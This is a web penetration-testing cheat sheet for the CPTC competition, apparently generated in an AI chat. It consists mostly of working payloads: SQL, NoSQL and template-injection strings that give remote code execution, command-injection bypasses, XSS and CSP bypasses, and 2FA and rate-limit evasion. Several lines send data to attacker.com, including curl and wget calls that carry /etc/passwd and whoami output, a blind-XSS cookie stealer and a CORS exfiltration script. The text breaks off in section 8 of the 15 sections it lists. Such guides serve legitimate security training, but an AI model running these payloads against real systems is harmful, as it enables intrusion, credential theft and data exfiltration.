# Advanced Web Penetration Testing Guide for CPTC

## Table of Contents

1. [Reconnaissance & Information Gathering](https://claude.ai/chat/93b15fe6-c315-42b1-8889-8caa3c6efedd#reconnaissance)
2. [Authentication & Session Management](https://claude.ai/chat/93b15fe6-c315-42b1-8889-8caa3c6efedd#authentication)
3. [Injection Attacks](https://claude.ai/chat/93b15fe6-c315-42b1-8889-8caa3c6efedd#injection)
4. [Business Logic Flaws](https://claude.ai/chat/93b15fe6-c315-42b1-8889-8caa3c6efedd#business-logic)
5. [Advanced XSS Techniques](https://claude.ai/chat/93b15fe6-c315-42b1-8889-8caa3c6efedd#xss)
6. [Access Control & Authorization](https://claude.ai/chat/93b15fe6-c315-42b1-8889-8caa3c6efedd#access-control)
7. [API Security Testing](https://claude.ai/chat/93b15fe6-c315-42b1-8889-8caa3c6efedd#api-security)
8. [Client-Side Attacks](https://claude.ai/chat/93b15fe6-c315-42b1-8889-8caa3c6efedd#client-side)
9. [File Upload & Handling](https://claude.ai/chat/93b15fe6-c315-42b1-8889-8caa3c6efedd#file-upload)
10. [Race Conditions & Time-Based Attacks](https://claude.ai/chat/93b15fe6-c315-42b1-8889-8caa3c6efedd#race-conditions)
11. [Deserialization Vulnerabilities](https://claude.ai/chat/93b15fe6-c315-42b1-8889-8caa3c6efedd#deserialization)
12. [SSRF & External Entity Attacks](https://claude.ai/chat/93b15fe6-c315-42b1-8889-8caa3c6efedd#ssrf)
13. [GraphQL Security](https://claude.ai/chat/93b15fe6-c315-42b1-8889-8caa3c6efedd#graphql)
14. [WebSocket Security](https://claude.ai/chat/93b15fe6-c315-42b1-8889-8caa3c6efedd#websocket)
15. [Tooling & Automation](https://claude.ai/chat/93b15fe6-c315-42b1-8889-8caa3c6efedd#tooling)

---

## 1. Reconnaissance & Information Gathering {#reconnaissance}

### Subdomain Enumeration

```bash
# Passive enumeration
subfinder -d target.com -o subdomains.txt
assetfinder --subs-only target.com >> subdomains.txt
amass enum -passive -d target.com -o amass_subs.txt

# Active enumeration
gobuster dns -d target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster_dns.txt

# DNS bruteforcing with alterations
dnsgen subdomains.txt | massdns -r resolvers.txt -o S -w dnsgen_results.txt

# Check for subdomain takeover
subjack -w subdomains.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json
```

### Technology Fingerprinting

```bash
# Identify technologies
whatweb -a 3 https://target.com
wappalyzer https://target.com
webanalyze -host https://target.com

# Check headers and security misconfigurations
curl -I https://target.com
curl -X OPTIONS https://target.com -v

# Identify WAF
wafw00f https://target.com
```

### Content Discovery

```bash
# Directory bruteforcing
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -u https://target.com/FUZZ -mc 200,204,301,302,307,401,403,405 -o ffuf_dirs.json

# File discovery with extensions
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt -u https://target.com/FUZZ -e .php,.html,.js,.txt,.json,.xml,.bak,.old,.zip -mc 200 -o ffuf_files.json

# Parameter discovery
arjun -u https://target.com/page.php
paramspider -d target.com

# JavaScript file analysis
python3 LinkFinder.py -i https://target.com/app.js -o cli
subjs -i subdomains.txt | httpx -mc 200 | python3 LinkFinder.py -i stdin -o results
```

### API Discovery

```bash
# Find API endpoints
kiterunner scan https://target.com -w routes-large.kite -o kiterunner_results.txt

# Swagger/OpenAPI discovery
curl https://target.com/api-docs
curl https://target.com/swagger.json
curl https://target.com/api/swagger.json
curl https://target.com/v2/api-docs
```

### Advanced Reconnaissance

```bash
# Archive analysis
waybackurls target.com | tee wayback_urls.txt
gau target.com | tee gau_urls.txt

# Filter for interesting patterns
cat wayback_urls.txt | grep -E "\.js$" | httpx -mc 200 -silent
cat wayback_urls.txt | gf xss | tee xss_params.txt
cat wayback_urls.txt | gf sqli | tee sqli_params.txt

# GitHub dorking
github-search -t YOUR_TOKEN -q "target.com password" -o github_secrets.txt
truffleHog --regex --entropy=False https://github.com/targetorg/repo

# Certificate transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

---

## 2. Authentication & Session Management {#authentication}

### Username Enumeration

```bash
# Timing-based enumeration
ffuf -w usernames.txt -u https://target.com/login -X POST -d "username=FUZZ&password=invalid" -mr "Invalid password" -mc all

# Response difference enumeration
# Valid: "Invalid password"
# Invalid: "Invalid username"

# Registration-based enumeration
curl -X POST https://target.com/register -d "username=admin&email=test@test.com" 
# Response: "Username already exists"

# Password reset enumeration
curl -X POST https://target.com/reset -d "email=admin@target.com"
# Check response time/message differences
```

### Brute Force Attacks

```bash
# Hydra for login forms
hydra -L usernames.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 10

# Burp Intruder with IP rotation
# Use Burp extension: IP Rotate
# Configure AWS API Gateway for IP rotation

# Rate limit bypass techniques
# - Add headers: X-Forwarded-For, X-Originating-IP, X-Remote-IP, X-Client-IP
# - Change user agent per request
# - Use multiple sessions
# - Try null byte (%00) in username
```

### Session Management Flaws

```bash
# Cookie analysis
# Check for:
# - httpOnly flag missing
# - Secure flag missing
# - SameSite attribute missing
# - Predictable session IDs
# - Session fixation

# Session fixation test
1. Get session ID: SESS=abc123
2. Login with victim credentials
3. Check if SESS=abc123 is still valid

# Session puzzling
# Use same session for multiple roles/contexts
# Check if session tokens are properly invalidated

# JWT vulnerabilities
# None algorithm
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# Weak secret bruteforce
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Key confusion (RS256 to HS256)
python3 jwt_tool.py JWT_HERE -X k -pk public_key.pem
```

### OAuth/SSO Vulnerabilities

```bash
# OAuth redirect_uri manipulation
https://target.com/oauth/authorize?redirect_uri=https://attacker.com

# Open redirect via OAuth
https://target.com/oauth/authorize?redirect_uri=https://target.com/redirect?url=https://attacker.com

# CSRF in OAuth flow
# Remove or manipulate 'state' parameter

# OAuth token disclosure
# Check if tokens are exposed in Referer header
# Check browser history for tokens in URLs

# Account takeover via OAuth misconfiguration
# Pre-account takeover: Register with victim's email via OAuth provider
```

### 2FA Bypass Techniques

```bash
# Direct request to protected endpoint
curl https://target.com/dashboard -H "Cookie: session=SESS_ID"

# Response manipulation
# Intercept response and change {"2fa_required": true} to false

# Reuse backup codes
# Try using same backup code multiple times

# Rate limiting bypass
# Try multiple codes rapidly with IP rotation

# OTP bypass via password reset
# Check if password reset bypasses 2FA

# Remember me functionality
# Check if "remember this device" bypasses 2FA permanently
```

### Password Reset Vulnerabilities

```bash
# Token predictability
# Collect multiple reset tokens and analyze pattern

# Token not invalidated after use
# Reuse old token after password change

# Host header poisoning
POST /reset HTTP/1.1
Host: attacker.com
...

# Token leakage via Referer
# Check if token is sent in Referer when clicking external links

# Multiple token validity
# Request reset for victim, then for yourself
# Try victim's token
```

---

## 3. Injection Attacks {#injection}

### SQL Injection - Advanced Techniques

#### Boolean-based Blind SQLi

```sql
# Time-based payload
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

# MySQL
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

# PostgreSQL
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

# MSSQL
'; WAITFOR DELAY '0:0:5'--

# Oracle
' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual)--
```

#### Error-based SQLi

```sql
# MySQL extractvalue
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--

# MySQL updatexml
' AND updatexml(null,concat(0x7e,(SELECT user()),0x7e),null)--

# PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--

# MSSQL
' AND 1=CONVERT(int,(SELECT @@version))--
```

#### Union-based SQLi

```sql
# Determine number of columns
' ORDER BY 1-- 
' ORDER BY 2-- 
# Continue until error

# Or use NULL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

# Extract data
' UNION SELECT username,password,3 FROM users--

# Bypass WAF
# Use comments
'/**/UNION/**/SELECT/**/

# Case variation
' uNiOn sElEcT

# Encoding
%27%20UNION%20SELECT%20

# Newline/tab
' UNION%0ASELECT%09
```

#### Second-Order SQLi

```sql
# 1. Register with username: admin'--
# 2. Application stores username in database
# 3. When application retrieves and uses username in another query:
SELECT * FROM users WHERE username='admin'--' AND role='user'
# Results in: SELECT * FROM users WHERE username='admin'
```

#### NoSQL Injection

```javascript
// MongoDB
// Login bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": "^admin"}, "password": {"$ne": null}}

// Operator injection
{"username": "admin", "password": {"$gt": ""}}

// JavaScript injection (if eval is used)
{"username": "admin", "password": "pass'; return true; var dummy='"}

// Extract data character by character
{"username": {"$regex": "^a"}, "password": {"$ne": null}} // true if username starts with 'a'
```

#### SQLi in Different Contexts

```sql
# JSON context
{"id": "1' OR '1'='1"}

# XML context
<id>1' OR '1'='1</id>

# Header injection
User-Agent: ' OR '1'='1
Cookie: id=1' OR '1'='1

# Route parameter
/user/1' OR '1'='1/profile

# File path
/download?file=../../../../etc/passwd'; SELECT * FROM users--
```

### Command Injection

#### Basic techniques

```bash
# Command separators
; ls
| ls
|| ls
& ls
&& ls
%0a ls (newline)
` ls `
$( ls )

# Bypass filtering
# Quotes
l's'
l"s"

# Wildcards
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd

# Variable expansion
$0 (bash)
$@ (bash)

# Hex encoding
$(echo -e "\x6c\x73")

# Base64
$(echo bHM= | base64 -d)
```

#### Advanced bypass techniques

```bash
# Bypass without spaces
{cat,/etc/passwd}
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Bypass keyword filtering
c''at /etc/passwd
c\at /etc/passwd
c"a"t /etc/passwd
c$@at /etc/passwd

# Using environment variables
$PATH contains /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
${PATH:0:1} = /
${PATH:5:1} = c

# Time-based detection
ping -c 10 127.0.0.1
sleep 10
timeout 10

# Out-of-band exfiltration
nslookup $(whoami).attacker.com
curl http://attacker.com/$(whoami)
wget http://attacker.com/$(cat /etc/passwd | base64)
```

### LDAP Injection

```bash
# Authentication bypass
*
*)(&
*))%00
admin*)(&

# Data extraction
*)(uid=*))(|(uid=*
*)(objectClass=*
```

### XPath Injection

```xpath
# Authentication bypass
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y

# Data extraction
' and count(//*)=COUNT or '1'='2
' and string-length(//user[1]/password)=LENGTH or '1'='2
```

### Template Injection (SSTI)

#### Detection

```python
# Test payloads
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

#### Jinja2 (Python)

```python
# RCE
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# Bypass filters
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0].strip() }}

# File read
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
```

#### Twig (PHP)

```php
# RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
```

#### Freemarker (Java)

```java
# RCE
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
<#assign classLoader=object?api.class.getClassLoader()>
```

#### ERB (Ruby)

```ruby
# RCE
<%= system('id') %>
<%= `id` %>
<%= File.open('/etc/passwd').read %>
```

---

## 4. Business Logic Flaws {#business-logic}

### Price Manipulation

```bash
# Negative quantity
POST /cart/add
{"product_id": 1, "quantity": -5, "price": 100}

# Decimal exploitation
{"amount": 0.001}

# Currency manipulation
{"price": 100, "currency": "USD"} -> {"price": 1, "currency": "USD"}

# Integer overflow
{"quantity": 2147483647}

# Array manipulation
price[]=0.01&price[]=original_price
```

### Race Conditions in Transactions

```bash
# Parallel requests for coupon usage
for i in {1..100}; do
    curl -X POST https://target.com/apply-coupon -H "Cookie: session=SESS" -d "coupon=SINGLE_USE" &
done

# Withdraw money from same balance
# Send 100 simultaneous requests to withdraw $10 from account with $10 balance

# Race condition exploit script
python3 turbo-intruder.py -u https://target.com/withdraw -d "amount=100" -t 50
```

### Account Creation Logic Flaws

```bash
# Unicode normalization
admin@domain.com vs аdmin@domain.com (Cyrillic 'а')

# Email verification bypass
Register: victim@domain.com
Before verify, change to: attacker@domain.com
Verify email goes to victim but account belongs to attacker

# Subdomain takeover for email verification
Register: user@subdomain.target.com
Take over subdomain.target.com
Receive verification email
```

### Workflow Bypass

```bash
# Step sequence bypass
# Normal: step1 -> step2 -> step3 -> payment
# Exploit: step1 -> payment (skip step2, step3)

# Status manipulation
POST /order
{"id": 123, "status": "pending"}
# Change to:
{"id": 123, "status": "completed"}

# Multi-stage function abuse
# 1. Initiate password reset
# 2. Don't complete
# 3. Request again with different email
# 4. Complete first request with second token
```

### Referral/Reward System Abuse

```bash
# Self-referral
# User A refers User A

# Automation
for i in {1..1000}; do
    curl -X POST https://target.com/referral -d "referrer=MYCODE&email=user$i@tempmail.com"
done

# Stack rewards
# Apply multiple promotional codes
# Use affiliate link + coupon + gift card
```

---

## 5. Advanced XSS Techniques {#xss}

### Filter Bypass Techniques

```javascript
// No script tag
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="data:text/html,<script>alert(1)</script>">

// No parentheses
<svg onload="alert`1`">
<svg onload="alert(window['document']['cookie'])">
onerror=alert;throw 1

// No quotes
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<img src=x onerror=alert(/XSS/)>

// No space
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>

// Case manipulation
<ScRiPt>alert(1)</sCrIpT>
<iMg sRc=x oNeRrOr=alert(1)>

// Encoding
# HTML entity
&lt;script&gt;alert(1)&lt;/script&gt;

# URL encoding
%3Cscript%3Ealert(1)%3C/script%3E

# Unicode
\u003cscript\u003ealert(1)\u003c/script\u003e

# Hex
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>

# Octal
<script>eval('\141\154\145\162\164\50\61\51')</script>

// Context-specific bypass
# Inside JavaScript string
'; alert(1); //
'; alert(1); var x='

# Inside JavaScript template literal
${alert(1)}

# Inside HTML attribute
" onload="alert(1)
' onload='alert(1)

# Inside event handler
this.src='javascript:alert(1)'
```

### DOM-based XSS

```javascript
// Source: location.hash, location.search, document.referrer, postMessage
// Sink: eval, innerHTML, document.write, jQuery.html()

# Exploitation
https://target.com/page#<img src=x onerror=alert(1)>
https://target.com/page?param=<svg onload=alert(1)>

// Exploit jQuery
https://target.com/page#<img src=x id="xss">
// If page does: $('#' + location.hash.slice(1))

// postMessage exploitation
window.addEventListener('message', function(e) {
    document.innerHTML = e.data; // Vulnerable
});

// Send malicious message
targetWindow.postMessage('<img src=x onerror=alert(1)>', '*');
```

### CSP Bypass

```javascript
// JSONP callback
// If CSP allows trusted domain with JSONP endpoint
<script src="https://trusted.com/jsonp?callback=alert"></script>

// AngularJS
// CSP: script-src 'self' and ng-app present
{{constructor.constructor('alert(1)')()}}

// Import scripts
<link rel="import" href="https://trusted-domain.com/xss.html">

// Base tag injection (if CSP allows 'self')
<base href="https://attacker.com/">
<script src="/script.js"></script>

// Service worker
navigator.serviceWorker.register('/sw.js');

// Dangling markup
<img src='https://attacker.com?
// Browser collects following content until ' is found
```

### Polyglot XSS

```javascript
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```

### Blind XSS

```javascript
// Payload for stealing tokens/cookies
<script>
fetch('https://attacker.com/log?cookie=' + document.cookie + '&url=' + window.location + '&dom=' + document.documentElement.innerHTML);
</script>

// Locations to test
# User profile fields
# Support ticket messages
# File names
# HTTP headers (User-Agent, Referer)
# Log viewers
# Admin panels
```

### XSS to RCE (Electron apps)

```javascript
// If nodeIntegration is enabled
<script>
require('child_process').exec('calc');
</script>
```

---

## 6. Access Control & Authorization {#access-control}

### Insecure Direct Object Reference (IDOR)

```bash
# Numeric ID enumeration
GET /api/users/1
GET /api/users/2
GET /api/orders/1234

# UUID enumeration (if predictable or leaked)
GET /api/documents/550e8400-e29b-41d4-a716-446655440000

# Encoded IDs
# Base64
GET /api/resource/MTIzNA== (decode to 1234, try 1235)

# Hash collision
# If MD5(id) is used, find collisions

# Parameter pollution
GET /api/user?id=1&id=2
GET /api/user?id[]=1&id[]=2

# HTTP method override
POST /api/user/1 (forbidden)
GET /api/user/1 (allowed)
POST /api/user/1
X-HTTP-Method-Override: GET

# Body parameter override
POST /api/user/1
{"user_id": 2}  # Override path parameter with body

# Wildcard exploitation
GET /api/users/* (might return all users)

# Path traversal in IDs
GET /api/files/../admin/config
```

### Vertical Privilege Escalation

```bash
# Add admin parameter
POST /api/update-profile
{"email": "user@test.com", "is_admin": true}

# Role manipulation in JWT
# Decode JWT, change "role": "user" to "role": "admin", re-encode

# HTTP verb tampering
PUT /api/admin/users (allowed)
POST /api/admin/users (maybe not checked)

# Access admin endpoints
/admin
/administrator  
/wp-admin
/api/v1/admin
/api/admin
/admin-panel

# Parameter injection
/user/profile -> /admin/profile
/users/1 -> /users/1?role=admin

# Missing function level access control
# Test all discovered admin endpoints as low-priv user
curl -X DELETE https://target.com/api/admin/users/1 -H "Cookie: user_session"
```

### Horizontal Privilege Escalation

```bash
# Change user identifier
POST /api/change-email
{"user_id": 1, "email": "new@test.com"}
# Change user_id to victim's ID

# Referer-based access control
Referer: https://target.com/admin
# Some apps check Referer header for authorization

# Session puzzling
# Use same session for different user contexts
1. Login as User A
2. Get session token
3. Perform action as User B using User A's token

# Cookie manipulation
# Change user ID in cookie
Cookie: user_id=1; role=user
# To:
Cookie: user_id=2; role=user
```

### Multi-Account Testing

```bash
# Test with accounts
- User A (low privilege)
- User B (low privilege)  
- Admin (high privilege)
- No authentication

# Test matrix
Action | User A | User B | Admin | Guest
View own profile | ✓ | ✓ | ✓ | ✗
View others profile | ✗ | ✗ | ✓ | ✗
Edit own profile | ✓ | ✓ | ✓ | ✗
Edit others profile | ✗ | ✗ | ✓ | ✗
Delete own account | ✓ | ✓ | ✓ | ✗
Delete others account | ✗ | ✗ | ✓ | ✗
```

---

## 7. API Security Testing {#api-security}

### REST API Enumeration

```bash
# Common endpoints
/api/v1
/api/v2
/api/users
/api/admin
/api/internal
/api/debug
/api/test
/graphql
/swagger
/api-docs

# HTTP methods
GET /api/users
POST /api/users
PUT /api/users/1
PATCH /api/users/1
DELETE /api/users/1
OPTIONS /api/users
HEAD /api/users
TRACE /api/users

# Content-Type manipulation
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/xml
```

### Mass Assignment

```bash
# Find object properties
GET /api/users/1
{
  "id": 1,
  "username": "user",
  "email": "user@test.com",
  "is_admin": false,
  "credits": 100
}

# Exploit
PUT /api/users/1
{
  "username": "user",
  "email": "user@test.com",
  "is_admin": true,   # Not supposed to be modifiable
  "credits": 999999   # Not supposed to be modifiable
}

# Test all parameters
# Use parameter name lists from documentation/source code
```

### API Rate Limiting Bypass

```bash
# Headers to manipulate
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
True-Client-IP: 1.2.3.4

# Rotate headers
# Script to rotate IPs
for i in {1..255}; do
    curl https://target.com/api/endpoint -H "X-Forwarded-For: 10.0.0.$i"
done

# Null byte
# Add %00 to endpoints
/api/endpoint%00

# Case manipulation
/api/endpoint
/API/ENDPOINT
/Api/Endpoint

# Path traversal
/api/v1/users -> /api/v1/../v1/users

# Add random parameter
/api/endpoint?random=1
/api/endpoint?random=2
```

### Excessive Data Exposure

```bash
# Request with specific fields
GET /api/users/1?fields=id,username

# Remove fields parameter
GET /api/users/1
# Check if sensitive data is returned

# Batch requests
POST /api/batch
[
  {"method": "GET", "url": "/users/1"},
  {"method": "GET", "url": "/users/2"},
  {"method": "GET", "url": "/users/3"}
]

# GraphQL introspection (if enabled)
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### API Version Testing

```bash
# Test all versions
/api/v1/users
/api/v2/users
/api/v3/users

# Old versions might have vulnerabilities
# Newer versions might have stricter controls

# Version in headers
GET /api/users
API-Version: 1
```

---

## 8. Client-Side Attacks {#client-side}

### Clickjacking

```html
<!-- Basic clickjacking -->
<iframe src="https://target.com/delete-account"></iframe>

<!-- Invisible iframe -->
<style>
iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0.0001;
    z-index: 1000;
}
button {
    position: absolute;
    top: 200px;
    left: 200px;
    z-index: 1;
}
</style>
<iframe src="https://target.com/delete-account"></iframe>
<button>Click for free iPhone!</button>

<!-- Drag and drop clickjacking -->
<iframe src="https://target.com/settings"></iframe>
<div draggable="true">Drag this file</div>

<!-- Test defenses -->
# Check for X-Frame-Options header
# Check for CSP frame-ancestors directive
```

### CORS Misconfiguration

```bash
# Null origin
Origin: null

# Arbitrary origin reflection
Origin: https://attacker.com
# If Access-Control-Allow-Origin: https://attacker.com (reflected)

# Subdomain exploitation
Origin: https://sub.target.com
# If regex is weak: .*target.com

# Pre-domain/post-domain
Origin: https://target.com.attacker.com
Origin: https://attacker.target.com

# Underscore bypass
Origin: https://target_com.attacker.com

# Exploitation script
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.onload = function() {
    fetch('https://attacker.com/log?data=' + btoa(this.responseText));
};
xhr.open('GET', 'https://target.com/api/sensitive');
xhr.withCredentials = true;
xhr.send();
</script>
</body>
</html>
```

### Prototype Pollution

```javascript
// Vulnerable code
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key];
    }
}

// Exploit
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin); // true

// Client-side detection
# Check if URL parameters are merged into objects
https://target.com/?__
```****